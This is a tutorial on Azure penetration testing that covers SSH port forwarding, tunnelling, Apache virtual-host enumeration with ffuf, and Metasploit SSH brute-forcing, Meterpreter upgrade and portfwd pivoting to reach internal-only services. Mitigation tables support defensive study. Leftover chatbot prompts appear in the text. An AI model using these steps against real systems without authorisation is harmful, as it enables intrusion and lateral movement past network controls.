# Port Forwarding and Tunnelling

**Objective**: Understand and exploit *port forwarding*, *SSH tunneling*, and *Apache virtual host misconfigurations* within Azure environments. These tactics are especially useful during  *post-exploitation*, *lateral movement*, or *web application discovery* phases when targeting misconfigured virtual machines or internal services.

**Key Concepts**📖:

- **Port Forwarding (NAT-based Access)** 🔁
  - Port forwarding in Azure refers to exposing internal services (e.g., on a VM) by forwarding traffic from a **public IP** and port to a **private IP** and internal port.
  - **Scenario**: An attacker gains access to a low-privilege VM and sets up **SSH-based port forwarding** to reach internal-only services like PostgreSQL, Redis, or web admin panels.
  - **Azure Limitation**: Azure NSGs (Network Security Groups) and firewalls usually prevent unauthorized access to internal ports—**unless** explicitly misconfigured or abused via SSH tunnels.
- **Tunneling** 🔒:
  - Tunneling securely transports network traffic from one point to another (often through SSH or VPN), enabling access to otherwise unreachable internal services.
  - **Real-world Use**: Create a reverse or forward tunnel to pivot to another VM or subnet.
  - Example SSH Forward Tunnel: `ssh -L 8080:10.0.0.5:80 azureuser@10.0.0.4`
    - 8080: Local port on attacker machine.
    - 10.0.0.5:80: Internal service behind 10.0.0.4 (pivot point).
    - azureuser@10.0.0.4: Initial foothold VM.

## Virtual Host Enumeration on Azure Web Servers 🛠️

**🧱 What is Apache Virtual Hosting?**

In a cloud or on-prem context, **virtual hosting** allows hosting multiple websites on a single server/IP. This is commonly used in **multi-tenant** Azure VMs and can be exploited during penetration
tests.

- Vulnerability arises when:
  - Hidden domains are misconfigured or poorly secured.
  - Sensitive dev/admin portals are only accessible via obscure ServerNames.
  - Virtual hosts are not properly segmented or protected.

**🧪 Lab Simulation: Setting Up Apache Virtual Hosts in Azure VM**

**🔧 Prerequisites (Local or Azure VM)**

| **Component** | **Use Case**           |
|---------------|------------------------|
| Ubuntu VM     | Target machine         |
| Kali VM       | Attacking machine      |
| Apache2       | Web server to simulate |

**⚙️ Step 1: Install Apache2 on Target Ubuntu VM**

sudo apt update && sudo apt install apache2 -y

**📁 Step 2: Create Website Directory**

sudo mkdir -p /sbin/test

echo "\<h1\>Hidden Virtual Host\</h1\>" \| sudo tee
/sbin/test/index.html

**🔧 Step 3: Modify Apache ports.conf**

sudo nano /etc/apache2/ports.conf

Add:

Listen 127.0.0.1:8080

This ensures the virtual host only listens on localhost (simulating
hidden/internal site).

**🧾 Step 4: Create the Virtual Host Config**

sudo nano /etc/apache2/sites-available/test.conf

Paste:

\<VirtualHost 127.0.0.1:8080\>

DocumentRoot /sbin/test/

ServerName hidden.internal.local

AllowEncodedSlashes NoDecode

\<Directory "/sbin/test/"\>

Require all granted

AllowOverride All

Options FollowSymLinks MultiViews

\</Directory\>

\</VirtualHost\>

**✅ Step 5: Enable and Restart Apache**

sudo a2ensite test.conf

sudo systemctl restart apache2

**🕵️‍♂️ Attacking Scenario: Discovering and Accessing Hidden Virtual
Hosts**

**1. Port Forward to Access Internal Site**

Assuming attacker has SSH access to a VM in the subnet:

ssh -L 8080:127.0.0.1:8080 azureuser@\<vm-ip\>

Then, in the browser or curl:

curl -H "Host: hidden.internal.local" http://127.0.0.1:8080

**2. Virtual Host Enumeration**

Use ffuf or Gobuster with a wordlist to find hidden virtual hosts:

ffuf -u http://127.0.0.1:8080 -H "Host: FUZZ" -w
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

**🧯 Mitigation in Azure**

| **Control Type** | **Recommendation** |
|----|----|
| NSG Rules | Block unused ports, never expose 8080 externally |
| Just-In-Time Access | Use Azure Defender JIT to restrict SSH |
| Application Gateway | Use WAF with host header rules |
| VNet Peering/Endpoints | Avoid public routing for internal services |
| Logging | Enable Azure Monitor logs and audit SSH/Apache logs |

**🧷 Summary**

| **Technique** | **Purpose** | **Tool/Example** |
|----|----|----|
| Port Forwarding | Reach internal services via NAT/tunnel | ssh -L 8080:10.0.0.5:80 ... |
| Tunneling | Secure traffic across network barriers | SSH, Autossh, Proxytunnel |
| Virtual Host Abuse | Discover hidden web apps on same host | ffuf, curl -H "Host: ..." ... |

Would you like a full **automated tunneling and virtual host discovery
script** to include in your Azure post-exploitation toolkit?

## Port Forwarding in Hub-Spoke & DMZ Scenarios

Here's a **corrected, expanded, and Azure-specific rewrite** of the
topic “**Port Forwarding in the Context of Azure Penetration Testing**,”
focusing specifically on environments that include **Azure Firewall**,
**Hub-Spoke VNET architecture**, and **DMZ subnet segmentation**. It
walks through the steps in detail and aligns them with how real-world
attackers or red teamers might move through an Azure cloud network.

**🔐 Azure Penetration Testing: Port Forwarding in Hub-Spoke & DMZ
Scenarios**

**🎯 Objective**

Demonstrate how **port forwarding** can be used in an Azure
environment—specifically targeting **spoke VMs**, **DMZ services**, or
**private-only resources**—to pivot through a **compromised machine**
behind Azure Firewall or in a **Hub VNET** architecture.

**📚 Azure Network Architecture Context**

In a typical **Hub-Spoke topology with Azure Firewall**, you have:

- **Hub VNET**: Centralized services (Azure Firewall, VPN Gateway,
  Bastion, DNS, etc.)

- **Spoke VNETs**: Application workloads and VMs, isolated using NSGs.

- **DMZ Subnet**: Exposes public-facing services via Azure Firewall or
  Load Balancer.

- **Restricted Internal Services**: Only accessible from the Hub or
  certain Bastion hosts.

**🛡️ Goal for Attacker**

- Pivot from a compromised **spoke VM** or **DMZ web server**.

- Access internal-only services (e.g., web app admin panels, databases).

- Bypass Azure Firewall and NSG rules using **port forwarding** or
  **tunnels**.

**🧰 Tools Required**

| **Tool**       | **Purpose**                          |
|----------------|--------------------------------------|
| Kali Linux     | Attacking machine (outside Azure)    |
| Metasploit     | Session handling and portfwd control |
| SSH or Socat   | Manual tunnels                       |
| Azure VM Agent | Optional method to run RunCommand    |

## Port Forwarding via Metasploit

### Step 1: Gain Initial Foothold in a Spoke VNET 💥

Assume you have compromised a **low-privileged Linux VM** inside the Spoke VNET (e.g., via SSH brute-force or vulnerable web app).

```ssh
use auxiliary/scanner/ssh/ssh_login

set RHOSTS 10.1.2.4

set USERNAME azureuser

set PASSWORD Welcome123!

exploit
```

### Step 2: Upgrade to Meterpreter Session 🔄

```ssh
sessions -u 1

sessions 2
```

Verify internal open ports:

```ssh
netstat -antp
```

Example output:

```ssh
tcp 0.0.0.0:8080 LISTEN nginx
```

This suggests a **web service** is running on port 8080 locally, not exposed publicly due to NSG or Azure Firewall rules.

### Step 3: Port Forward Internal Service to Attacker 🔁

Set up **port forwarding** from the attacker machine to the internal service:

```ssh
portfwd add -l 8081 -p 8080 -r 127.0.0.1
```

- -l 8081: Local port on Kali
- -p 8080: Remote port on victim
- -r 127.0.0.1: Localhost of victim

Then from Kali:

```ssh
curl http://127.0.0.1:8081
```

🎯 Now you're accessing an internal-only Azure service **from outside the network**, bypassing NSGs and the Azure Firewall via port forwarding.

**🌉 Alternative: Port Forwarding via SSH Tunnels (Manual)**

If SSH access is available:

ssh -L 8081:localhost:8080 azureuser@10.1.2.4

- Now visit http://127.0.0.1:8081 on Kali and interact with the private
  internal service.

**🛡️ Detection and Mitigation (Defensive Notes)**

| **Azure Control** | **Purpose** |
|----|----|
| Azure Firewall Logs | Detect port forwarding and lateral traffic |
| NSG Flow Logs | Monitor unexpected internal communications |
| Just-In-Time VM Access | Prevent persistent SSH access |
| Microsoft Defender for Cloud | Flag abnormal port usage, tunneling patterns |
| Disable Agent Tunnels | Harden VMs against RunCommand post-exploitation |

**Use Case: DMZ Web Server in Spoke VNET**

**Scenario**

A web app in the DMZ subnet (10.1.0.0/24) listens on:

- Public: Port 80 (via Load Balancer)
- Private: Port 8443 (Admin interface only reachable inside VNET)

Once the attacker gets access to this web server:

- They forward port 8443 to attacker box: `portfwd add -l 8443 -p 8443 -r 127.0.0.1`

Now they can access the internal admin panel directly via: https://127.0.0.1:8443

## Summary

1. Compromise a VM in DMZ or Spoke VNET
2. Discover internal-only services via netstat, nmap
3. Use Metasploit portfwd or SSH tunnels to forward ports
4. Access those services from the attacker machine
5. Move laterally deeper into the Azure network

## Write an Azure CLI script that automatically 🧩

- Detects open ports
- Creates SSH tunnels
- Exposes them on attackers Kali machine for multi-hop forwarding?

Automate This with autossh or socat

**END**🔚
